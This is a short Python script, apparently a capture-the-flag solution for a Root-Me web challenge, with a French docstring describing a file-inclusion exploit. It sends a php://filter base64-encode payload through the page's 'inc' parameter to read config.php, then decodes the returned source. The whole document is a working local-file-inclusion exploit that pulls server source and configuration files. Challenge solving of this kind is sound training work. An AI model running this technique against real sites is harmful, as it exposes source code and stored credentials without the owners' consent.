"""
Script permettant d'exploiter une faille permetant d'inclure des fichier grace au filtres PHP
"""
import requests
from models.webRessource import headers_base as headers
from bs4 import BeautifulSoup
import base64


def php_filter_exploit(url, fileName):
    result = []
    payload = "php://filter/read=convert.base64-encode/resource=" + fileName
    r = requests.get(url + payload, headers=headers)
    for h in BeautifulSoup(r.content, 'lxml'):
        try:
            result.append(base64.b64decode(h.text.strip()).decode('utf-8', errors="ignore"))
        except:
            pass
    return result


if __name__ == "__main__":
    for x in php_filter_exploit("http://challenge01.root-me.org/web-serveur/ch12/?inc=", "config.php"):
        print(x)
